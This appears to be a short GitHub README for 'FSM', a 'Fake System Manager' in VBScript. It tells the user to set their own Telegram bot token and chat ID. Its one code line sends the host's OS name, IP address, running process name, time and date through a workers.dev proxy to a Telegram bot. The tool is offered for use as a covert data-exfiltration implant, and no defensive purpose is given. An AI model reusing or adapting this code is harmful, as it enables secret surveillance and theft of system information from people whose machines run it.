# FSM
Fake System Manager
## Image
<img width="1919" height="1019" alt="image" src="https://github.com/user-attachments/assets/5d06101d-e1f9-422e-8e38-708ccefd61f3" />
<img width="497" height="1000" alt="image" src="https://github.com/user-attachments/assets/9831bab9-8dcc-4610-a269-67a418a01dbc" />
## Change
<pre>Token Bot Telegram & Chat ID</pre>
```VBS
http.Open "GET", "https://telegram.mrsaad.workers.dev/bot{TOKEN}/sendMessage?chat_id={ID}&text=" & os.Caption & " - " & ip.IPAddress(0) & " : " & objProcess.Name & " - " & Time & " - " & Date, False```
